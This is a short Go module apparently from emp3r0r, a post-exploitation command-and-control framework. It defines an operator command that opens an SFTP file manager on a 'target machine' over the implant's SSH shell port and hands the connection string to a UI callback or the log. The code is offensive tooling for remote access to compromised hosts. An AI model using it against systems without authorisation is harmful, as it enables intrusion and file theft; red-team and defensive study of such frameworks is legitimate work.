package modules

import (
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// CmdOpenFileManager open SFTP file manager on target machine
// This function is called by operator with a context that has UI callbacks
func CmdOpenFileManager(ctx *c2context.C2Context) {
	go func() {
		connStr, sshErr := SSHClient("sftp", "", live.RuntimeConfig.SSHDShellPort)
		if sshErr != nil {
			logging.Errorf("openFileManager: %v", sshErr)
			return
		}

		// Call UI callback if provided
		if ctx.OnUIReady != nil {
			err := ctx.OnUIReady(connStr)
			if err != nil {
				logging.Errorf("UI callback failed: %v", err)
			}
		} else {
			logging.Successf("File manager ready! Connection command:\n%s", connStr)
			logging.Infof("Note: Set ctx.OnUIReady to handle UI automatically")
		}
	}()
}
